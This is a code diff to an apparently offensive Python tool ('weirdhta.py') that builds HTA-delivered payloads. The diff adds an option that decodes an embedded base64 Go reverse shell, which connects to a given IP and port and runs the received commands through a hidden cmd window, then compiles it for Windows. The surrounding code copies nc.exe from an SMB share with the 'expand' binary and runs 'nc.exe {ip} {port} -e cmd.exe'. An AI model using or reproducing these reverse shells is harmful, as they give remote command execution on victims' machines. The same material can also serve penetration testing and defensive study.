@@ -12,6 +12,7 @@ def Main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-ip", "--ip", help="IP address", type=str)
     parser.add_argument("-p", "--port", help="PORT", type=str)
+    parser.add_argument("-go", "--golang", help="Go reverse shell (currently making it)", action="store_true")
     parser.add_argument("-s","--smb", help="execute nc.exe via smb", action="store_true")
     parser.add_argument("-n","--normal", help="normal powershell rev", action="store_true")
     parser.add_argument("-c", "--command", help="Run your custom command")
@@ -39,7 +40,7 @@ def Main():
         payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
         return payload
     
-    def smb_shell(ip, share):
+    def smb_shell(ip, share, fname):
         if os.path.exists('smbserver.py') != True:
             print("[*] Downloading smbserver.py")
             r = requests.get("https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py")
@@ -48,7 +49,7 @@ def Main():
                 f.close()
 
         #https://lolbas-project.github.io/lolbas/Binaries/Expand/
-        rev = f"expand \\\\\\\\{ip}\\\\{share}\\\\nc.exe c:\\\\users\\\\public\\\\nc.exe"
+        rev = f"expand \\\\\\\\{ip}\\\\{share}\\\\{fname} c:\\\\users\\\\public\\\\{fname}"
         print(rev)
         return rev
 
@@ -58,6 +59,23 @@ def Main():
         rev = f"c:\\\\users\\\\public\\\\nc.exe {ip} {port} -e cmd.exe"
         print(rev)
         return rev
+
+    def go(ip, port):
+        #https://gist.githubusercontent.com/yougg/b47f4910767a74fcfe1077d21568070e/raw/5a314b4faaa6e5428af1131bde35b6ed38e160c1/reversecmd.go
+        compiler = "GOOS=windows GOARCH=386 go build /tmp/shell.go"
+        rev_b64 = "cGFja2FnZSBtYWluCmltcG9ydCgiYnVmaW8iCiJuZXQiCiJvcy9leGVjIgoic3lzY2FsbCIKKQpmdW5jIG1haW4oKXtyZXZlcnNlKCJTVVBFUklQQTpQT1JUIil9CmZ1bmMgcmV2ZXJzZShob3N0IHN0cmluZyl7YywgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLGhvc3QpCmlmIG5pbCAhPSBlcnIge2lmIG5pbCAhPSBjIHtjLkNsb3NlKCl9fQpyIDo9IGJ1ZmlvLk5ld1JlYWRlcihjKQpmb3Ige29yZGVyLCBlcnIgOj0gci5SZWFkU3RyaW5nKCdcbicpCmlmIG5pbCAhPSBlcnIge2MuQ2xvc2UoKQpyZXZlcnNlKGhvc3QpCnJldHVybn0KY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgb3JkZXIpCmNtZC5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9Cm91dCwgXyA6PSBjbWQuQ29tYmluZWRPdXRwdXQoKQpjLldyaXRlKG91dCl9fQo="
+        rev_plain = base64.b64decode(rev_b64).decode()
+        rev = rev_plain.replace("SUPERIPA", ip).replace("PORT", port)
+        with open("/tmp/shell.go", 'w', encoding = 'utf-8') as f:
+            f.write(rev)
+            f.close()
+        try:
+            print("[*] Compiling shell.go")
+            os.system(compiler)
+            print("[*] Compiled!")
+            sys.stdout = None
+        except:
+            print("[*] Please install golang!")
     
     def custom_command(cmd):
         rev = cmd.replace("\\" , "\\\\")
@@ -96,7 +114,8 @@ def Main():
 
     elif args.smb:
         share = input("[*] Enter your share name : ")
-        payload = smb_shell(args.ip, share)
+        fname = "nc.exe"
+        payload = smb_shell(args.ip, share, fname)
         fname = "download_nc.hta"
         hta_smb(payload, fname)
         payload = smb_exec(args.ip, args.port)
@@ -113,6 +132,9 @@ def Main():
         payload = custom_command(args.command)
         print(payload)
         custom_hta(payload)
+    elif args.golang:
+        payload = go(args.ip, args.port)
+        print(payload)
     else:
         sys.exit("[*] python3 weirdhta.py -h")
 
